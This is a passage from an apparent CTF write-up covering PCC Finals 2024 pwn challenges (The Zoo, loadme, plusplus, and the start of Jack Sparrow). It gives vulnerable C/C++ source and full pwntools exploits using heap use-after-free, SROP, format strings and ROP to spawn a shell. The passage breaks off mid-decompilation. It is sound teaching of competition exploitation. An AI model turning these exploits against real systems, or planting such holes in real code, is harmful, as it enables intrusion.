if(!animals[id]) {\n        printf(\"[!] Cannot modify a non-existing animal.\\n\");\n        exit(1);\n    }\n\n    if(animals[id]-&gt;price &lt; 0) {\n        printf(\"[!] Cannot modify the price of the animal.\\n\");\n        exit(1);\n    }\n\n    if(animals[id]-&gt;is_sold || animals[id]-&gt;owner_id &gt;= 0) {\n        printf(\"[!] Cannot modify the animal as it is already sold.\\n\");\n        exit(1);\n    }\n\n    printf(\"Enter the new name of the animal: \");\n    read(0, animals[id]-&gt;name, MAX_BUFFER_SIZE);\n    animals[id]-&gt;name[strcspn(animals[id]-&gt;name, \"\\n\")] = 0;\n    printf(\"Enter the new price of the animal: \");\n    scanf(\"%d%*c\", &amp;animals[id]-&gt;price);\n}\nvoid buy_animal() {\n    int animal_id, owner_id;\n    printf(\"Enter the animal id you want to buy: \");\n    scanf(\"%d%*c\", &amp;animal_id);\n    printf(\"Enter the owner id you want to buy: \");\n    scanf(\"%d%*c\", &amp;owner_id);\n\n    if(animal_id &lt; 0 || animal_id &gt;= MAX_OBJS || owner_id &lt; 0 || owner_id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    if(!animals[animal_id] || !owners[owner_id]) {\n        printf(\"[!] Cannot buy an animal from non-existing owner or animal.\\n\");\n        exit(1);\n    }\n\n    if(animals[animal_id]-&gt;is_sold) {\n        printf(\"[!] Animal already sold.\\n\");\n        exit(1);\n    }\n\n    animals[animal_id]-&gt;owner_id = owner_id;\n    animals[animal_id]-&gt;is_sold = true;\n    owners[owner_id]-&gt;ownedAnimals++;\n    printf(\"[*] Animal %s bought by %s\\n\", animals[animal_id]-&gt;name, owners[owner_id]-&gt;name);\n}\nvoid print_animal() {\n    int id;\n    printf(\"Enter the id you want to print: \");\n    scanf(\"%d%*c\", &amp;id);\n\n    if(id &lt; 0 || id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    if(!animals[id]) {\n        printf(\"[!] Cannot print a non-existing animal.\\n\");\n        exit(1);\n    }\n\n    printf(\"Animal ID: %d\\n\", animals[id]-&gt;id);\n    printf(\"Animal Name: %s\\n\", animals[id]-&gt;name);\n    printf(\"Animal Price: %d\\n\", animals[id]-&gt;price);\n    printf(\"Animal Owner ID: %d\\n\", animals[id]-&gt;owner_id);\n    printf(\"Animal Sold: %s\\n\", animals[id]-&gt;is_sold ? \"Yes\" : \"No\");\n}\n\n// ** Setup Zoo based on area ** //\nvoid __init_zoo() {\n    printf(\"Welcome to the Zoo. Hope you'll have fun.\\n\");\n}\nvoid __leave_zoo() {\n    printf(\"Thank you for visting the zoo. But it is time to leave now!\\n\");\n    exit(0);\n}\n\n/* All Zoo related tasks */\nvoid create_zoo() {\n    struct Zoo *obj = (struct Zoo*)malloc(sizeof(struct Zoo)); // 0x18\n    obj-&gt;name = (char*)malloc(MAX_BUFFER_SIZE);\n    void (*lh)() = __leave_zoo;\n    obj-&gt;handler =  (g_zooID % 2 == 0) ? __init_zoo : &amp;lh;\n    printf(\"Enter the name of the Zoo: \");\n    size_t sz = read(0, obj-&gt;name, MAX_BUFFER_SIZE);\n    obj-&gt;name[strcspn(obj-&gt;name, \"\\n\")] = 0;\n    obj-&gt;zoo_id = g_zooID++;\n    zoos[obj-&gt;zoo_id] = obj;\n    printf(\"[*] Created zoo %s with id: %d\\n\", obj-&gt;name, obj-&gt;zoo_id);\n}\nvoid delete_zoo() {\n    int id;\n    printf(\"Enter the id you want to delete: \");\n    scanf(\"%d%*c\", &amp;id);\n\n    if(id &lt; 0 || id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    if(!zoos[id]) {\n        printf(\"[!] Cannot empty an already empty zoo chunk.\");\n        exit(1);\n    }\n\n    void *name = zoos[id]-&gt;name;\n    free(zoos[id]);\n    if(name) free(name);\n    printf(\"[*] Zoo %d deleted successfully.\\n\", id);\n}\n\nvoid visit_zoo() {\n    printf(\"Which zoo do you want to visit: \");\n    int id;\n    scanf(\"%d%*c\", &amp;id);\n\n    if(id &lt; 0 || id &gt;= MAX_OBJS) {\n        printf(\"[!] Cannot read data from out of bounds\\n\");\n        exit(1);\n    }\n\n    if(!zoos[id]) {\n        printf(\"[!] Cannot visit a non-existing zoo.\\n\");\n        exit(1);\n    }\n\n    uintptr_t handler = (uintptr_t)zoos[id]-&gt;handler;\n\n    bool check = 0;\n    _check_corrupt:\n    if(handler != (uintptr_t)__init_zoo &amp;&amp; handler != (uintptr_t)__leave_zoo &amp;&amp; (&amp;handler &lt; handler)) {\n        printf(\"[!] Corrupted handler.\\n\");\n        exit(1);\n    }\n    if(!check) {\n        if((handler+0x10) == ((uintptr_t)&amp;handler))\n            handler = *(uintptr_t*)handler+0x10;\n        check = 1;\n        goto _check_corrupt;\n    }\n    if(check) zoos[id]-&gt;handler = (void(*)())handler;\n    zoos[id]-&gt;handler();\n}\n\nvoid menu() {\n    printf(\"=== Zoo Management System ===\\n\");\n    printf(\"1. Create Owner\\n\");\n    printf(\"2. Delete Owner\\n\");\n    printf(\"3. Create Animal\\n\");\n    printf(\"4. Delete Animal\\n\");\n    printf(\"5. Modify Animal\\n\");\n    printf(\"6. Buy Animal\\n\");\n    printf(\"7. Print Animal\\n\");\n    printf(\"8. Create Zoo\\n\");\n    printf(\"9. Delete Zoo\\n\");\n    printf(\"10. Visit Zoo\\n\");\n    printf(\"0. Exit\\n\");\n}\n\nint main(int argc, char* argv[], char* envp[]) {\n\n    while(1) {\n        menu();\n        int choice;\n        printf(\"Enter your choice: \");\n        scanf(\"%d%*c\", &amp;choice);\n\n        switch(choice) {\n            case 1:\n                create_owner();\n                break;\n            case 2:\n                delete_owner();\n                break;\n            case 3:\n                create_animal();\n                break;\n            case 4:\n                delete_animal();\n                break;\n            case 5:\n                modify_animal();\n                break;\n            case 6:\n                buy_animal();\n                break;\n            case 7:\n                print_animal();\n                break;\n            case 8:\n                create_zoo();\n                break;\n            case 9:\n                delete_zoo();\n                break;\n            case 10:\n                visit_zoo();\n                break;\n            case 0:\n                goto _ret;\n                break;\n            default:\n                puts(\"[!] Invalid choice.\");\n                break;\n        }\n    }\n_ret:\n    return 0;\n}\n</code></pre> <p>The program is a menu-driven program. It has a bunch of options. I won't go into details of each of them but the high-level description is that the program manages 3 entities. Owners, Animals and Zoos. We can create and delete owners. We can create, delete, modify, buy and print animals. We can create, delete and visit zoos.</p> <p>All of these entities' objects are stored in their respective arrays. Each array can hold a maximum of 16 objects. These arrays are initialized to <code>NULL</code> at start of the program.</p> <p>Owner has name, ID and number of animals owned as its struct members. Creating an Owner asks us for name of the owner and initializes the rest of the members to default values. Deletion asks us for ID of the owner to be deleted.</p> <p>Animal has name, price, ID, owner's ID and sold status as its struct members. Creating an Animal asks us for its name and price and initializes the rest to default values. Deletion asks for the animal ID to delete. Modifying an animal lets us change the animal's name and price. Buying an animal sets the owner's ID to the specified owner's ID and sets the sold status to true. Printing an animal prints values of its members.</p> <p>Zoo has ID, name and a function's address as its struct members. The function's address is named handler. Creating a Zoo asks us for its name, sets ID to the lowest one available and initializes the handler to either address of <code>__init_zoo</code> function (if ID is an even value) or equal to address of a stack variable that hold address of <code>__leave_zoo</code> function (if ID is an odd value).</p> <p>All of these objects are allocated on the heap using <code>malloc</code> with their respective sizes. The name members are also allocated of the heap and have the size <code>24</code>. Names are read using <code>fgets</code> so no buffer overflows. But the deletion function do not null-out the pointers in the arrays. Leading to a Use-After-Free (UAF) situation.</p> <p>The remote container was running the latest libc and the binary had Full RELRO, NX, PIE and Canary enabled.</p>"},{"location":"PCC%20Finals%202024/CTF/The%20Zoo/#exploitation","title":"Exploitation","text":"<p>Since we had a UAF vulnerability on all entities, exploitation was a matter of leaking the right values and overwriting something to get RIP control. Libc being latest ruled out heap hooks since newer libc versions do not use those hooks anymore. My initial idea was to overwrite the zoo's <code>handler</code> member to one-gadget or system and get the shell. But for that, we needed a libc leak.</p> <p>In heap challenges involving handling of multiple entities usually require some kind of confusion or overlap of freed objects to perform exploitation. Since we could only print members of Animal types, I needed to control the value it would print to leak libc.</p> <p>Since the libc is latest and all objects are of sizes (mentioned in comments of code) less than <code>0x410</code>, these objects will be handled by <code>tcache</code>. <code>tcache</code> has Last-In-First-Out (LIFO) behavior. Looking closely at the deletion function, the object is freed first then the name is freed. This puts the name chunk at start of the list (because it was the last chunk freed) and creation functions have the opposite order of allocation. This lets us confuse name and object chunk of entity as object and name chunk of another. This way when I will print the name of the first type (original type), it will actually print contents of the second type's chunk (confuse type) and when I will modify the name of first type, it actually overwrite members of the second type and vice versa.</p> <p>Since we could only print animals, Animal had to be one of the types. I chose Zoo as the first type and Animal as the second, because Zoo had either a function address or a stack address and that would give me a few leaks.</p> <p>I used the following code to perform this: <pre><code># Get binary leak by overlapping animal with a deleted zoo\nZ1 = create_zoo(\"Z1\")\ndelete_zoo(Z1)\n\nA1 = create_animal(\"stdnoerr\"*2, 99999, False)\nprint_animal(A1)\n\nelf.address = u64(p.recvlines(2)[-1].split()[-1][0x10:].ljust(8, b'\\x00')) - elf.sym.__init_zoo\n\nprint(hex(elf.address))\n</code></pre></p> <p>Now if you were to choose Zoo as the first type and Animal as the second, you could overwrite Animal's name address and then when print the animal, it will print the contents of that address. This gives as an arbitrary read. But it will only read the contents until a null-byte is found because the name is printed via <code>printf</code> using <code>%s</code>.</p> <p>I used this primitive to read a GOT entry to get the libc leak. Using the following code: <pre><code># Get libc leak by overlapping zoo with a delete animal (read GOT)\nA2 = create_animal(\"stdnoerr\", 9999)\ndelete_animal(A2)\n\nZ2 = create_zoo(p64(elf.got.puts))\n\nprint_animal(A2)\n\nlibc.address = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\\x00')) - libc.sym.puts\n\nprint(hex(libc.address))\n</code></pre></p> <p>Then I tried to overwrite the Zoo's <code>handler</code> with one-gadgets, none worked. I tried using system but <code>RDI</code> contained address of the index specified. Then I decided to do ROP on main's return. For this I needed a stack leak.</p> <p>I got the stack leak by reading the libc's <code>environ</code> symbol's value. At that time, I didn't notice the stack pointer in zoo's structure. Equipped with the stack leak and libc leak, I did a <code>ret2libc</code> attack to execute system.</p> <pre><code># Leak stack from libc environ (using previous technique)\nA3 = create_animal(\"stdnoerr\", 9999)\ndelete_animal(A3)\n\nZ3 = create_zoo(p64(libc.sym.environ))\n\nprint_animal(A3)\n\nstack_leak = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\\x00'))\nprint(hex(stack_leak))\n</code></pre> <p>To write the ROP chain on stack, I used the same confusion of Animal with a zoo. We could only write <code>24</code> (0x18) bytes this way because names are limited to <code>24</code> bytes. When I executed the ROP chain, I got the infamous stack alignment error in system function. To circumvent this, I followed the execution of <code>system</code> function in gdb and skipped one of the push in the code by modifying the chain. The made the stack pointer aligned to <code>16</code> bytes and I got the flag.</p> <pre><code>A3 = create_animal(\"stdnoerr\", 9999)\ndelete_animal(A3)\n\nZ3 = create_zoo(p64(stack_leak - 304))\n\nmodify_animal(A3, p64(libc.address + POP_RDI) + p64(libc.address + 0x1cb42f) + p64(libc.address + 0x582c0 + 2), 9999)\n\nsendchoice(0)\n</code></pre> <p>Side Note: The stack alignment error in system is caused by an instruction in the libc code that uses <code>XMM</code> registers. These registers are used to hold floating point values. There are of size <code>128</code>-bit. Because of this, they are used to perform fast copying of arguments (data) in libc code. These instructions require the stack pointer (<code>rsp</code>) to be a multiple of <code>16</code> (0x10). If that is not the case, it generates a SEGFAULT which halts the execution. The stack pointer becomes misaligned because we popped address of <code>/bin/sh</code> from the stack in the ROP chain.</p>"},{"location":"PCC%20Finals%202024/CTF/The%20Zoo/#final-exploit","title":"Final Exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\nzooID = 0\nownerID = 0\nanimalID = 0\n\ndef start() -&gt; tube:\n    if args.REMOTE:\n        return remote(\"192.168.18.50\", 50789)\n    else:\n        return elf.process()\n\ndef attach_gdb() -&gt; None:\n    if args.REMOTE or args.NOGDB:\n        return\n\n    gdb.attach(p, '''\n    heap chunks\n    heap bins\n    continue\n               ''')\n    input(\"ATTACHED?\")\n\ndef sendchoice(choice: int):\n    p.sendlineafter(\"choice: \", str(choice).encode())\n\ndef create_owner(name: bytes):\n    sendchoice(1)\n\n    if isinstance(name, str):\n        name = name.encode()\n\n    p.sendafter(\": \", name + b'\\n' if len(name) &lt; 0x18 else name)\n\n    global ownerID\n    ownerID += 1\n\n    return ownerID - 1\n\ndef delete_owner(_id: int):\n    sendchoice(2)\n\n    p.sendlineafter(\": \", str(_id).encode())\n\ndef create_animal(name: bytes, price: int | bytes, append_newline: bool = True):\n    sendchoice(3)\n\n    if isinstance(name, str):\n        name = name.encode()\n\n    p.sendafter(\": \", name + (b'\\n' if append_newline else b'') if len(name) &lt; 0x18 else name)\n    p.sendlineafter(\": \", str(price).encode() if isinstance(price, int) else price)\n\n    global animalID\n    animalID += 1\n\n    return animalID - 1\n\ndef delete_animal(_id: int):\n    sendchoice(4)\n\n    p.sendlineafter(\": \", str(_id).encode())\n\ndef modify_animal(_id: int, name: bytes, price: int):\n    sendchoice(5)\n\n    p.sendlineafter(\": \", str(_id).encode())\n    p.sendafter(\": \", name + b'\\n' if len(name) &lt; 0x18 else name)\n    p.sendlineafter(\": \", str(price).encode() if isinstance(price, int) else price)\n\ndef buy_animal(animalID: int, ownerID: int):\n    sendchoice(6)\n\n    p.sendlineafter(\": \", str(animalID).encode())\n    p.sendlineafter(\": \", str(ownerID).encode())\n\ndef print_animal(_id: int):\n    sendchoice(7)\n\n    p.sendlineafter(\": \", str(_id).encode())\n\ndef create_zoo(name: int):\n    sendchoice(8)\n\n    if isinstance(name, str):\n        name = name.encode()\n\n    p.sendafter(\": \", name + b'\\n' if len(name) &lt; 0x18 else name)\n\n    global zooID\n    zooID += 1\n\n    return zooID - 1\n\ndef delete_zoo(_id: int):\n    sendchoice(9)\n\n    p.sendlineafter(\": \", str(_id).encode())\n\ndef visit_zoo(_id: int):\n    sendchoice(10)\n\n    p.sendlineafter(\": \", str(_id).encode())\n\ncontext.binary = elf = ELF(\"./thezoo_patched\")\nlibc = elf.libc\n\nPOP_RDI = 0x000000000010f75b\n\np = start()\n\n# Get binary leak by overlapping animal with a deleted zoo\nZ1 = create_zoo(\"Z1\")\ndelete_zoo(Z1)\n\nA1 = create_animal(\"stdnoerr\"*2, 99999, False)\nprint_animal(A1)\n\nelf.address = u64(p.recvlines(2)[-1].split()[-1][0x10:].ljust(8, b'\\x00')) - elf.sym.__init_zoo\nprint(hex(elf.address))\n\n# Get libc leak by overlapping zoo with a delete animal (read GOT)\nA2 = create_animal(\"stdnoerr\", 9999)\ndelete_animal(A2)\n\nZ2 = create_zoo(p64(elf.got.puts))\n\nprint_animal(A2)\n\nlibc.address = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\\x00')) - libc.sym.puts\nprint(hex(libc.address))\n\n# Leak stack from libc environ (using previous technique)\nA3 = create_animal(\"stdnoerr\", 9999)\ndelete_animal(A3)\n\nZ3 = create_zoo(p64(libc.sym.environ))\n\nprint_animal(A3)\n\nstack_leak = u64(p.recvlines(2)[-1].split()[-1].ljust(8, b'\\x00'))\nprint(hex(stack_leak))\n\n# Write rop on main return\nA3 = create_animal(\"stdnoerr\", 9999)\ndelete_animal(A3)\n\nZ3 = create_zoo(p64(stack_leak - 304))\n\nmodify_animal(A3, p64(libc.address + POP_RDI) + p64(libc.address + 0x1cb42f) + p64(libc.address + 0x582c0 + 2), 9999)\n\nsendchoice(0)\n# attach_gdb()\n\np.interactive()\np.close()\n</code></pre>"},{"location":"PCC%20Finals%202024/ShowDown/Round%201%20-%20loadme/","title":"Round 1   loadme","text":"<p>The round 1 challenge was named loadme and had the description \"I mean it does get easier than this. It's just a question of how well you know your basics\"</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%201%20-%20loadme/#analysis","title":"Analysis","text":"<p>After reversing it in ghidra, we get the following decompiled code <pre><code>undefined8 main(void)\n{\n  size_t filenameSize;\n  char *c;\n  undefined buf [256];\n  char filename [264];\n  void *ptr;\n  size_t filesize;\n  FILE *fp;\n\n  memset(filename,0,0x100);\n  printf(\"Enter file you want to read: \");\n  fgets(filename,0x100,stdin);\n  filenameSize = strcspn(filename,\"\\n\");\n  filename[filenameSize] = '\\0';\n  printf(\"[*] Reading %s into memory...\\n\",filename);\n  fp = fopen(filename,\"rb\");\n  if ((((fp != (FILE *)0x0) &amp;&amp; (c = strstr(filename,\"flag\"), c == (char *)0x0)) &amp;&amp;\n      (c = strstr(filename,\"loadme\"), c == (char *)0x0)) &amp;&amp;\n     (c = strstr(filename,\"bin\"), c == (char *)0x0)) {\n    fseek(fp,0,2);\n    filesize = ftell(fp);\n    fseek(fp,0,0);\n    ptr = mmap((void *)0x13370000,filesize,7,0x21,-1,0);\n    memset(ptr,0,filesize);\n    fread(ptr,1,filesize,fp);\n    fclose(fp);\n    printf(\"I\\'m sorry, I never asked for your name: \");\n    read(0,buf,0x400);\n    return 0;\n  }\n  puts(\"Error: Invalid file.\");\n  return 1;\n}\n</code></pre></p> <p>The program first asks for a file path, replaces the newline character with a null (if any) and then opens the file. The filename cannot contain the string \"flag\", \"loadme\" or \"bin\". Then the file size is calculated, <code>mmap</code> is called with the file size and the contents are copied in the pages returned by <code>mmap</code> then it reads 0x400 (1024) bytes in a buffer of size 0x100 (256) which is a clear buffer overflow. Taking a look at the binary permissions, we see that it has Full RELRO, PIE and NX but no canary.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%201%20-%20loadme/#exploitation","title":"Exploitation","text":"<p>The PIE threw me off and I thought it was an error on the organizers side. After confirming that PIE was intended, I was puzzled. I completely ignored the mmap arguments.</p> <p>Then first hint was released and it read \"Maybe the <code>mmap</code> chunk has funny permissions\". Then I saw that the <code>prot</code> (protections) argument was set to <code>7</code> which means that <code>mmap</code> will return a page that has <code>RWX</code> permissions. It became apparent that we had to jump to the chunk to execute code in it and we could do that because the address of the chunk was fixed to <code>0x133713370000</code>.</p> <p>My next attempt was to somehow open stdin using the file open and read shellcode in to <code>mmap</code> chunk and jump to it. I tried opening stdin using <code>/proc/self/fd/0</code> and <code>/dev/stdin</code>. Both didn't work since these files are un-seekable and <code>ftell</code> would return <code>-1</code>. This was resulting in a crash since in <code>memset</code>.</p> <p>Then second hint was released and it read \"Try opening a file that will give you some useful 'gadgets'\". The brain jumped to the conclusion that it was libc that we were supposed to open. For some reason, I thought we could only jump to one address in libc (dumb I know) and I tried to jump to one-gadget. None worked.</p> <p>When 3 minutes and 29 seconds left, the third hint was released and it read something along the lines of Running one-gadgets might work as expected, how else can you do instead **CALL**ing **SYS**tem. The highlighted fragments made the string \"syscall\" and my brain was all around the place trying to come up with a solution and I was under a lot of pressure since it was the first challenge and only 3 minutes were left. I somehow managed to remember SigReturn Oriented Programming (SROP) and pulled the pwntools docs for the syntax, made an execve syscall frame and found a gadget that would make the <code>sigreturn</code> syscall and just executed the payload on remote without testing locally. It worked and I executed <code>./submitter 18</code>  and completed the challenge.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%201%20-%20loadme/#exploit","title":"Exploit","text":"<p>Here's the final exploit</p> <pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef start() -&gt; tube:\n    if args.REMOTE:\n        return remote(\"challs.airoverflow.com\", 63440)\n    else:\n        return elf.process()\n\ndef attach_gdb() -&gt; None:\n    if args.REMOTE or args.NOGDB:\n        return\n\n    gdb.attach(p, '''\n    b *main +533\n    continue\n               ''')\n    input(\"ATTACHED?\")\n\ncontext.binary = elf = ELF(\"./loadme\")\nlibc = elf.libc\n\np = start()\n\np.sendlineafter(\": \", \"/lib/x86_64-linux-gnu/libc.so.6\")\n\nret = SigreturnFrame()\nret.rdi = 0x13370000 + 0x1cb42f\nret.rsi = 0\nret.rdx = 0\nret.rax = 0x3b\nret.rip = 0x13370000 + 0x00000000000288b5 # syscall; ret\n\npayload = b'A'*552 + p64(0x13370000 + 0x0000000000045320) + \\ # mov rax, 0xf, syscall\n          bytes(ret)\np.sendlineafter(\": \", payload)\n\np.interactive()\np.close()\n</code></pre>"},{"location":"PCC%20Finals%202024/ShowDown/Round%201%20-%20loadme/#comments","title":"Comments","text":"<p>In retrospect, if I didn't make assumptions, closely at the primitives and made a plan without considering the pressure, I would have done ROP. Lesson learned. Overall, the challenge was unconventional and awesome. It really did test your basics and my brain that has a habit of overcomplicating simple things.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%202%20-%20plusplus/","title":"Round 2   plusplus","text":"<p>The round 2 challenge was named plusplus and was a C++ challenge. The source was provided this time and the description read \"Everything is better in C++\"</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%202%20-%20plusplus/#code-analysis","title":"Code Analysis","text":"<p>Here's the provided source <pre><code>// g++ -o plusplus plusplus.cxx -w -std=c++23 -lfmt -fno-stack-protector -fPIE\n\n#define NDEBUG\n\n#include &lt;iostream&gt;\n#include &lt;string.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;fmt/core.h&gt;\n\n#define MAX_BUF_SIZE 0x100\n#define MAX_PRINT_SZ 0x50\n\n__attribute__((constructor))\nvoid __constructor__(){\n    setvbuf(stdin, NULL, _IONBF, 0);\n    setvbuf(stdout, NULL, _IONBF, 0);\n    setvbuf(stderr, NULL, _IONBF, 0);\n}\n\nint safe_str_input(char *buffer, int size) {\n    int sz = -1;\n    while(buffer[sz] != '\\n') { buffer[++sz] = getchar(); }\n    buffer[sz] = 0;\n    return sz;\n}\n\nint main() {\n    // Run me once, shame on you. Run me twice, shame on me.\n    char buf[MAX_BUF_SIZE];\n    char buf_2[MAX_BUF_SIZE];\n    snprintf(buf_2, MAX_BUF_SIZE, \"%p\", &amp;setvbuf); // help-help-help\n    char output[MAX_BUF_SIZE];\n\n    memset(output, 0, MAX_BUF_SIZE);\n    for(int i = 0; i &lt; 2; ++i) {\n\n        for(int j=0;j&lt;=i;++j) std::cout &lt;&lt; \"+\";\n        std::cout &lt;&lt; \" \";\n        if(safe_str_input(buf, MAX_BUF_SIZE) &lt; 0) break;\n        if(i) break;\n        size_t sz = strlen(buf);\n        if(sz &lt;= 1) continue;\n        buf[(sz &gt;= MAX_BUF_SIZE) ? MAX_BUF_SIZE-1 : strcspn(buf, \"\\n\")] = 0;\n        fmt::format_to(output, fmt::runtime(buf), MAX_PRINT_SZ);\n        std::cout &lt;&lt; std::string(output) &lt;&lt; std::endl;\n    }\n\n    return 0;\n}\n</code></pre></p> <p>Looking at the code, we see that the program is running two nested loops. The outer loop runs twice and the inner loop runs equal to the outer-loop's counter times. It also places the address of <code>setvbuf</code> function in the buffer <code>buf_2</code></p> <p>In the first run of the outer loop, the inner loop will call the function <code>safe_str_input</code> on buffer <code>buf</code> with size <code>MAX_BUF_SIZE</code> (0x100) and then it will call <code>fmt::format_to</code>, our provided input as the <code>format</code> argument and the output being stored in <code>output</code> buffer and the output was printed on stdout.  In second run of the outer loop, the inner loop will only call <code>safe_str_input</code> and terminate both the inner and outer loop and return from main.</p> <p>Looking closely at the <code>safe_str_input</code> function, we observe that it will keep on reading characters from stdin and writing them into the provided buffer until it receives a newline. It doesn't perform any bounds check for the buffer. It shows behavior similar to the infamous <code>gets</code> function. The difference being that <code>gets</code> replaces the newline with a null byte but it adds a null-byte after the newline (which will then be replaced by a null byte in main function). Hence a buffer overflow can be caused.</p> <p>Looking at the protections enabled (can be inferred from the compiler arguments given in the top comment), we find that PIE, Full RELRO and NX are enabled but canary is disabled. This confirmed that buffer overflow was imminent.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%202%20-%20plusplus/#exploitation","title":"Exploitation","text":"<p>After finding the format string and buffer overflow vulnerabilities, I was looking for a leak to do a <code>ret2libc</code> attack. I thought we could leak the stack contents like we do in C <code>printf</code> format string attacks. I pulled up the C++ does for the <code>fmt::format_to</code> function and was reading the format string syntax. It uses a syntax similar to Python's <code>str.format</code> function. I tried giving indices to read arguments beyond the provided one (still under the impression that it was similar to <code>printf</code> format string).</p> <p>After attempting multiple indices and types (you can specify the type being printed in the format), the program wasn't letting me print any argument other than the first argument and that only in integer format. The issue was that C++ does runtime checks for verifying argument's indices and types with the ones that we provided during compilation, unlike <code>printf</code> that has no runtime checks because it has no runtime type information.</p> <p>At this point the first hint was released, that read \"The format documentation is quite extensive. You just need to look into expansions\". Expansions are same as those of <code>printf</code>. We specify a width of the argument being printed and the value is padding with space (default) or the specified character from the left (default) or the right to make the string have the specified width. Example expansions: <code>printf</code>: <code>%&lt;offset&gt;$&lt;width&gt;&lt;specifier&gt;</code>, <code>%2$20d</code>, <code>%20d</code>, <code>%-20s</code> <code>fmt</code>: <code>{&lt;offset&gt;:&lt;width&gt;&lt;specifier&gt;}</code>, <code>{2:20d}</code>, <code>{:20d}</code>, <code>{:-20s}</code></p> <p>With this in mind, I experimented with a few different widths and found out that there were no bound checks on the <code>output</code> buffer, so we can overflow <code>output</code> and <code>fmt</code> wasn't performing any string termination either. Looking at the stack in <code>gdb</code>, you get the following layout: <pre><code>[output buffer]\n[buf_2 buffer]\n[buf buffer]\n[saved rbp]\n[return address]\n</code></pre> This reminded me that there is a libc leak present in <code>buf_2</code>, I overflowed <code>output</code> with <code>{:256}</code> and got the following output: <pre><code>+ {:256}\n                                                                                                                                                                                                                                                              800x78ea92c88540\n++\n</code></pre> The address at the end is <code>setvbuf</code>. Now we have libc base and just need to perform buffer overflow in <code>buf</code> buffer, thanks to buffer overflow in <code>safe_str_input</code> function. I did a simple <code>ret2libc</code> attack to execute <code>system</code> function</p>"},{"location":"PCC%20Finals%202024/ShowDown/Round%202%20-%20plusplus/#final-exploit","title":"Final Exploit","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef start() -&gt; tube:\n    if args.REMOTE:\n        return remote(\"challs.airoverflow.com\", 32297)\n    else:\n        return elf.process()\n\ndef attach_gdb() -&gt; None:\n    if args.REMOTE or args.NOGDB:\n        return\n\n    gdb.attach(p, '''\n    b *main +730\n    continue\n               ''')\n    input(\"ATTACHED?\")\n\ncontext.binary = elf = ELF(\"./plusplus_patched\")\nlibc = elf.libc\n\nPOP_RDI = 0x000000000010f75b\nRET = POP_RDI + 1\nBIN_SH = 0x1cb42f\n\np = start()\n\np.sendlineafter(\"+ \", \"{:256}\")\nlibc_leak = int(p.recvline().strip()[2:], 0x10)\n\nlibc.address = libc_leak - libc.sym.setvbuf\n\nprint(hex(libc.address))\n\nrop = [\n    libc.address + POP_RDI, libc.address + BIN_SH,\n    libc.address + RET,\n    libc.sym.system\n]\n\nattach_gdb()\n\np.sendlineafter(\"++ \", b'A'*440 + b''.join([p64(x) for x in rop]))\n\np.interactive()\np.close()\n</code></pre>"},{"location":"PCC%20Finals%202024/ShowDown/Round%202%20-%20plusplus/#comments","title":"Comments","text":"<p>I really liked the idea of the challenge to show that format string are not limited to C's <code>printf</code> and can be helpful even with strict type-checking.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Semi%20Finals%20-%20Jack%20Sparrow/","title":"Semi Finals   Jack Sparrow","text":"<p>The semi-finals were held in the main auditorium. The challenge was named Jack Sparrow and no source was provided this time.</p>"},{"location":"PCC%20Finals%202024/ShowDown/Semi%20Finals%20-%20Jack%20Sparrow/#analysis","title":"Analysis","text":"<p>After reversing, we get the following decompiled code <pre><code>undefined4 menu(void)\n{\n  long in_FS_OFFSET;\n  undefined4 local_14;\n  long local_10;\n\n  local_10 = *(long *)(in_FS_OFFSET + 0x28);\n  puts(\"== Jack Sparrow\\'s choices ==\");\n  puts(\"1. Specify Destination\");\n  puts(\"2. Specify position (latitude and longitude)\");\n  puts(\"3. Abandon ship\");\n  printf(\"$ \");\n  get_input(&amp;local_14);\n  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {\n                    /* WARNING: Subroutine does not return */\n    __stack_chk_fail();\n  }\n  return local_14;\n}\n\nvoid specify_destination(char *param_1,int param_2)\n{\n  size_t sVar1;\n\n  if ((_spec &lt; 1) &amp;&amp; (-1 &lt; _spec)) {\n    say_jack(\"My crew, where shall we sail to?\\n\");\n    say_crew(\"\");\n    fgets(param_1,param_2,stdin);\n    sVar1 = strcspn(param_1,\"\\n\");\n    param_1[sVar1] = '\\0';\n    say_jack(\"Well crew, good choice: \");\n    printf(param_1);\n    puts(\"\");\n    _spec = _spec + 1;\n  }\n  else {\n    say_crew(\"Nah cap. That\\'ll be a problem if we change the destination now!\\n\");\n  }\n  return;\n}\n\nvoid alter_position(long param_1)\n{\n  if (*(int *)(param_1 + 0x60) == 0) {\n    say(\"Ragetti\",\"Tell me the coords\\n\");\n    say(\"Latitude\",\"\");\n    __isoc99_scanf(\"%llu\",param_1 + 0x50);\n    say(\"Longitude\",\"\");\n    __isoc99_scanf(\"%llu\",param_1 + 0x58);\n    say_jack(\"Wait, I think those are wrong. \");\n    printf(\"Latitude=%p Longitude=%p\\n\",*(undefined8 *)(param_1 + 0x50),\n           *(undefined8 *)(param_1 + 0x58));\n    say_jack(\"Yeah, they\\'re wrong..\");\n                    /* sus indirection */\n    **(undefined8 **)(param_1 + 0x50) = *(undefined8 *)(param_1 + 0x58);\n    say(\"Ragetti\",\"Too late cap. But I\\'ll make sure we don\\'t change course now.\\n\");\n    *(int *)(param_1 + 0x60) = *(int *)(param_1 + 0x60) + 1;\n  }\n  else {\n    say(\"Ragetti\",\"No cap! We already changed the position!\\n\");\n  }\n  return;\n}\n\nundefined8 main(void)\n{\n  int choice;\n  long in_FS_OFFSET;\n  undefined buf [96];\n  int local_18;\n  long local_10;\n  bool destFlag;\n\n  local_10 = *(long 